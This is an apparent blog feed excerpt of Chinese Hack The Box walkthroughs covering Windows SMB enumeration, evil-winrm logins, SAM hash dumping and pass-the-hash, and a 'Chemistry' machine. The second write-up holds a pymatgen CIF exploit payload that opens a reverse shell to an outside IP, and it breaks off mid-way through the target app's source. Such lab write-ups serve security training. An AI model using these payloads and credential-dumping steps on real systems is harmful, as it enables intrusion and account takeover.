id="enum4linux-ng扫描">enum4linux-ng扫描</h2><p>使用enum4linux-ng搜集所有与smb服务有关的信息</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">enum4linux-ng -A -u michael.wrightson -p <span class="string">&#x27;Cicada$M6Corpb*@Lp#nZp!8&#x27;</span> <span class="number">10.10</span><span class="number">.11</span><span class="number">.35</span> -t <span class="number">10</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1734078232468-3c2b9270-d766-4adf-9815-5c85a0c884cb.png" alt=""></p><p>发现了david的密码：aRt$Lp#7t*VQ!3</p><p>使用该用户进行smb连接</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1734078508381-40c8f96e-3aad-4256-a202-d4876029d838.png" alt=""></p><p>可以看到有一个文件下载下来使用get &quot;文件名&quot;命令</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1734078538443-737b9c71-a199-461f-939a-89ae3df6d3f0.png" alt=""></p><p>发现了用户名和密码</p><h2 id="winrm登录">winrm登录</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">evil-winrm -u emily.oscars -p <span class="string">&#x27;Q!3@Lp#M6b*7t*Vt&#x27;</span> -i <span class="number">10.10</span><span class="number">.11</span><span class="number">.35</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>使用evil-winrm 登录得到用户的flag</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1734078796810-70cd9ccc-215c-4b7c-a636-ed009f72e2eb.png" alt=""></p><h2 id="SeBackupPrivilege">SeBackupPrivilege</h2><p>查看当前用户的权限</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1734078879904-a89ebe2c-0fa1-45a3-9c32-b0ab95939a97.png" alt=""></p><p>关于这个 SeBackupPrivilege：<a href="https://www.hackingarticles.in/windows-privilege-escalation-sebackupprivilege/">Windows Privilege Escalation: SeBackupPrivilege – Hacking Articles</a></p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1734079438801-1265f913-898c-484c-a2ee-ab0700e16fe1.png" alt=""></p><h2 id="pypykatz">pypykatz</h2><p>使用 pypykatz 得到 admin 的 hash 值</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1734079937735-5303e9c5-9088-4b6e-9990-4a120fac1703.png" alt=""></p><h2 id="impacket-secretsdump">impacket-secretsdump</h2><p>或者使用impacket-secretsdump工具</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">impacket-secretsdump -sam sam -system system LOCAL</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1734080255327-5e871ced-8af9-41b9-a194-93de6a543292.png" alt=""></p><p>最后使用 <code>evil-winrm</code> 的 hash 登录到 admin，得到 root.txt</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">evil-winrm -u administrator -H 2b87e7c93a3e8a0ea4a581937016f341 -i <span class="number">10.10</span><span class="number">.11</span><span class="number">.35</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1734080047085-eb9bd664-2394-4281-9f8f-df0d0893ceec.png" alt=""></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;端口扫描&quot;&gt;端口扫描&lt;/h2&gt;
&lt;figure class=&quot;highlight python&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line</summary>
      
    
    
    
    <category term="攻防渗透" scheme="https://oceanzbz.github.io/categories/%E6%94%BB%E9%98%B2%E6%B8%97%E9%80%8F/"/>
    
    
    <category term="windows" scheme="https://oceanzbz.github.io/tags/windows/"/>
    
    <category term="渗透测试" scheme="https://oceanzbz.github.io/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
    <category term="HTB" scheme="https://oceanzbz.github.io/tags/HTB/"/>
    
  </entry>
  
  <entry>
    <title>Chemistry</title>
    <link href="https://oceanzbz.github.io/post/e57ce78a.html"/>
    <id>https://oceanzbz.github.io/post/e57ce78a.html</id>
    <published>2024-12-30T07:24:08.000Z</published>
    <updated>2025-03-05T07:24:36.809Z</updated>
    
    <content type="html"><![CDATA[<h2 id="端口扫描">端口扫描</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">nmap -sC -sV -T4 -Pn <span class="number">10.10</span><span class="number">.11</span><span class="number">.38</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>扫描结果</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1734070371395-44200458-e1fb-4574-9c4e-2783bbf70b3e.png" alt=""></p><p>没有扫出域名。所以直接访问5000端口看看</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1734070428517-90805783-a216-4d33-811f-dfeacd6219aa.png" alt=""></p><h2 id="漏洞利用">漏洞利用</h2><p>注册进来之后发现有一个上传页面</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1734070477361-05c630a3-8013-4edd-8508-d72767442a95.png" alt=""></p><p>说是让上传cif文件去搜一下CIF文件导致命令执行</p><p><a href="https://github.com/materialsproject/pymatgen/security/advisories/GHSA-vgv8-5cpj-qj2f">https://github.com/materialsproject/pymatgen/security/advisories/GHSA-vgv8-5cpj-qj2f</a></p><p>修改一下poc</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">data_5yOhtAoR</span><br><span class="line"></span><br><span class="line">_audit_creation_date <span class="number">2018</span>-<span class="number">06</span>-08</span><br><span class="line"></span><br><span class="line">_audit_creation_method <span class="string">&quot;Pymatgen CIF Parser Arbitrary Code Execution Exploit&quot;</span></span><br><span class="line"></span><br><span class="line">  </span><br><span class="line"></span><br><span class="line">loop_</span><br><span class="line"></span><br><span class="line">_parent_propagation_vector.id</span><br><span class="line"></span><br><span class="line">_parent_propagation_vector.kxkykz</span><br><span class="line"></span><br><span class="line">k1 [<span class="number">0</span> <span class="number">0</span> <span class="number">0</span>]</span><br><span class="line"></span><br><span class="line">  </span><br><span class="line"></span><br><span class="line">_space_group_magn.transform_BNS_Pp_abc <span class="string">&#x27;a,b,[d for d in ().__class__.__mro__[1].__getattribute__ ( *[().__class__.__mro__[1]]+[&quot;__sub&quot; + &quot;classes__&quot;]) () if d.__name__ == &quot;BuiltinImporter&quot;][0].load_module (&quot;os&quot;).system (&quot;/bin/bash -c \&#x27;sh -i &gt;&amp; /dev/tcp/10.10.16.8/1233 0&gt;&amp;1\&#x27;&quot;);0,0,0&#x27;</span></span><br><span class="line"></span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line"></span><br><span class="line">_space_group_magn.number_BNS <span class="number">62.448</span></span><br><span class="line"></span><br><span class="line">_space_group_magn.name_BNS <span class="string">&quot;P n&#x27; m a&#x27; &quot;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1734071073910-e61e8539-4147-4b44-8f72-0b02f85ba735.png" alt=""></p><p>在home目录下发现了rosa用户</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1734071228594-83132b2e-c060-4fbb-afe0-4b8b3d658dee.png" alt=""></p><p>但是没有权限读这个文件，但是这里我们可以看到该靶场的源码看看</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, render_template, request, redirect, url_for, flash</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> werkzeug.utils <span class="keyword">import</span> secure_filename</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> flask_sqlalchemy <span class="keyword">import</span> SQLAlchemy</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> flask_login <span class="keyword">import</span> LoginManager, UserMixin, login_user, login_required, logout_user, current_user</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pymatgen.io.cif <span class="keyword">import</span> CifParser</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> uuid</span><br><span class="line"></span><br><span class="line">  </span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line">app.config[<span class="string">&#x27;SECRET_KEY&#x27;</span>] = <span class="string">&#x27;MyS3cretCh3mistry4PP&#x27;</span></span><br><span class="line"></span><br><span class="line">app.config[<span class="string">&#x27;SQLALCHEMY_DATABASE_URI&#x27;</span>] = <span class="string">&#x27;sqlite:///database.db&#x27;</span></span><br><span class="line"></span><br><span class="line">app.config[<span class="string">&#x27;UPLOAD_FOLDER&#x27;</span>] = <span class="string">&#x27;uploads/&#x27;</span></span><br><span class="line"></span><br><span class="line">app.config[<span class="string">&#x27;ALLOWED_EXTENSIONS&#x27;</span>] = &#123;<span class="string">&#x27;cif&#x27;</span>&#125;</span><br><span class="line"></span><br><span class="line">  </span><br><span class="line"></span><br><span class="line">db = SQLAlchemy(app)</span><br><span class="line"></span><br><span class="line">login_manager = LoginManager(app)</span><br><span class="line"></span><br><span class="line">login_manager.login_view = <span class="string">&#x27;login&#x27;</span></span><br><span class="line"></span><br><span class="line">  </span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">User</span>(UserMixin, db.Model):</span><br><span class="line"></span><br><span class="line"><span class="built_in">id</span> = db.Column(db.Integer, primary_key=<span class="literal">True</span>)</span><br><span class="line"></span><br><span class="line">username = db.Column(db.String(<span class="number">150</span>), nullable=<span class="literal">False</span>, unique=<span class="literal">True</span>)</span><br><span class="line"></span><br><span class="line">password = db.Column(db.String(<span class="number">150</span>), nullable=<span class="literal">False</span>)</span><br><span class="line"></span><br><span class="line">  </span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Structure</span>(db.Model):</span><br><span class="line"></span><br><span class="line"><span class="built_in">id</span> = db.Column(db.Integer, primary_key=<span class="literal">True</span>)</span><br><span class="line"></span><br><span class="line">user_id = db.Column(db.Integer, db.ForeignKey(<span class="string">&#x27;user.id&#x27;</span>), nullable=<span class="literal">False</span>)</span><br><span class="line"></span><br><span class="line">filename = db.Column(db.String(<span class="number">150</span>), nullable=<span class="literal">False</span>)</span><br><span class="line"></span><br><span class="line">identifier = db.Column(db.String(<span class="number">100</span>), nullable=<span class="literal">False</span>, unique=<span class="literal">True</span>)</span><br><span class="line"></span><br><span class="line">  </span><br><span class="line"></span><br><span class="line"><span class="meta">@login_manager.user_loader</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">load_user</span>(<span class="params">user_id</span>):</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> User.query.get(<span class="built_in">int</span>(user_id))</span><br><span class="line"></span><br><span class="line">  </span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">allowed_file</span>(<span class="params">filename</span>):</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="string">&#x27;.&#x27;</span> <span class="keyword">in</span> filename <span class="keyword">and</span> filename.rsplit(<span class="string">&#x27;.&#x27;</span>, <span class="number">1</span>)[<span class="number">1</span>].lower() <span class="keyword">in</span> app.config[<span class="string">&#x27;ALLOWED_EXTENSIONS&#x27;</span>]</span><br><span class="line"></span><br><span class="line">  </span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">calculate_density</span>(<span class="params">structure</span>):</span><br><span class="line"></span><br><span class="line">atomic_mass_Si = <span class="number">28.0855</span></span><br><span class="line"></span><br><span class="line">num_atoms = <span class="number">2</span></span><br><span class="line"></span><br><span class="line">mass_unit_cell = num_atoms * atomic_mass_Si</span><br><span class="line"></span><br><span class="line">mass_in_grams = mass_unit_cell * <span class="number">1.66053906660e-24</span></span><br><span class="line"></span><br><span class="line">volume_in_cm3 = structure.lattice.volume * <span class="number">1e-24</span></span><br><span class="line"></span><br><span class="line">density = mass_in_grams / volume_in_cm3</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> density</span><br><span class="line"></span><br><span class="line">  </span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> render_template(<span class="string">&#x27;index.html&#x27;</span>)</span><br><span class="line"></span><br><span class="line">  </span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/register&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">register</span>():</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> request.method == <span class="string">&#x27;POST&#x27;</span>:</span><br><span class="line"></span><br><span class="line">username = request.form.get(<span class="string">&#x27;username&#x27;</span>)</span><br><span class="line"></span><br><span class="line">password = request.form.get(<span class="string">&#x27;password&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> User.query.filter_by(username=username).first():</span><br><span class="line"></span><br><span class="line">flash(<span class="string">&#x27;Username already exists.&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> redirect(url_for(<span class="string">&#x27;register&#x27;</span>))</span><br><span class="line"></span><br><span class="line">hashed_password = hashlib.md5(password.encode()).hexdigest()</span><br><span class="line"></span><br><span class="line">new_user = User(username=username, password=hashed_password)</span><br><span class="line"></span><br><span class="line">db.session.add(new_user)</span><br><span class="line"></span><br><span class="line">db.session.commit()</span><br><span class="line"></span><br><span class="line">login_user(new_user)</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> redirect(url_for(<span class="string">&#x27;dashboard&#x27;</span>))</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> render_template(<span class="string">&#x27;register.html&#x27;</span>)</span><br><span class="line"></span><br><span class="line">  </span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/login&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">login</span>():</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> request.method == <span class="string">&#x27;POST&#x27;</span>:</span><br><span class="line"></span><br><span class="line">username = request.form.get(<span class="string">&#x27;username&#x27;</span>)</span><br><span class="line"></span><br><span class="line">password = request.form.get(<span class="string">&#x27;password&#x27;</span>)</span><br><span class="line"></span><br><span class="line">user = User.query.filter_by(username=username).first()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> user <span class="keyword">and</span> user.password == hashlib.md5(password.encode()).hexdigest():</span><br><span class="line"></span><br><span class="line">login_user(user)</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> redirect(url_for(<span class="string">&#x27;dashboard&#x27;</span>))</span><br><span class="line"></span><br><span class="line">flash(<span class="string">&#x27;Invalid credentials&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> render_template(<span class="string">&#x27;login.html&#x27;</span>)</span><br><span class="line"></span><br><span class="line">  </span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/logout&#x27;</span></span>)</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@login_required</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">logout</span>():</span><br><span class="line"></span><br><span class="line">logout_user()</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> redirect(url_for(<span class="string">&#x27;index&#x27;</span>))</span><br><span class="line"></span><br><span class="line">  </span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/dashboard&#x27;</span></span>)</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@login_required</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dashboard</span>():</span><br><span class="line"></span><br><span class="line">structures = Structure.query.filter_by(user_id=current_user.<span class="built_in">id</span>).<span class="built_in">all</span>()</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> render_template(<span class="string">&#x27;dashboard.html&#x27;</span>, structures=structures)</span><br><span class="line"></span><br><span class="line">  </span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/upload&#x27;</span>, methods=[<span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@login_required</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">upload_file</span>():</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> <span class="string">&#x27;file&#x27;</span> <span class="keyword">not</span> <span class="keyword">in</span> request.files:</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> redirect(request.url)</span><br><span class="line"></span><br><span class="line">file = request.files[<span class="string">&#x27;file&#x27;</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> file.filename == <span class="string">&#x27;&#x27;</span>:</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> redirect(request.url)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> file <span class="keyword">and</span> allowed_file(file.filename):</span><br><span class="line"></span><br><span class="line">filename = secure_filename(file.filename)</span><br><span class="line"></span><br><span class="line">identifier = <span class="built_in">str</span>(uuid.uuid4())</span><br><span class="line"></span><br><span class="line">filepath = os.path.join(app.config[<span class="string">&#x27;UPLOAD_FOLDER&#x27;</span>], identifier + <span class="string">&#x27;_&#x27;</span> + filename)</span><br><span class="line"></span><br><span class="line">file.save(filepath)</span><br><span class="line"></span><br><span class="line">new_structure = Structure(user_id=current_user.<span class="built_in">id</span>, filename=filename, identifier=identifier)</span><br><span class="line"></span><br><span class="line">db.session.add(new_structure)</span><br><span class="line"></span><br><span class="line">db.session.commit()</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> redirect(url_for(<span class="string">&#x27;dashboard&#x27;</span>))</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> redirect(request.url)</span><br><span class="line"></span><br><span class="line">  </span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/structure/&lt;identifier&gt;&#x27;</span></span>)</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@login_required</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show_structure</span>(<span class="params">identifier</span>):</span><br><span class="line"></span><br><span class="line">structure_entry = Structure.query.filter_by(identifier=identifier, user_id=current_user.<span class="built_in">id</span>).first_or_404()</span><br><span class="line"></span><br><span class="line">filepath = os.path.join(app.config[<span class="string">&#x27;UPLOAD_FOLDER&#x27;</span>], structure_entry.identifier + <span class="string">&#x27;_&#x27;</span> + structure_entry.filename)</span><br><span class="line"></span><br><span class="line">parser = CifParser(filepath)</span><br><span class="line"></span><br><span class="line">structures = parser.parse_structures()</span><br><span class="line"></span><br><span class="line">structure_data = []</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> structure <span class="keyword">in</span> structures:</span><br><span class="line"></span><br><span class="line">sites = [&#123;</span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;label&#x27;</span>: site.species_string,</span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;x&#x27;</span>: site.frac_coords[<span class="number">0</span>],</span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;y&#x27;</span>: site.frac_coords[<span class="number">1</span>],</span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;z&#x27;</span>: site.frac_coords[<span class="number">2</span>]</span><br><span class="line"></span><br><span class="line">&#125; <span class="keyword">for</span> site <span class="keyword">in</span> structure.sites]</span><br><span class="line"></span><br><span class="line">lattice = structure.lattice</span><br><span class="line"></span><br><span class="line">lattice_data = &#123;</span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;a&#x27;</span>: lattice.a,</span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;b&#x27;</span>: lattice.b,</span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;c&#x27;</span>: lattice.c,</span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;alpha&#x27;</span>: lattice.alpha,</span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;beta&#x27;</span>: lattice.beta,</span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;gamma&#x27;</span>: lattice.gamma,</span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;volume&#x27;</span>: lattice.volume</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">density = calculate_density(structure)</span><br><span class="line"></span><br><span class="line">structure_data.append(&#123;</span><br><span class="line"></span><br><span 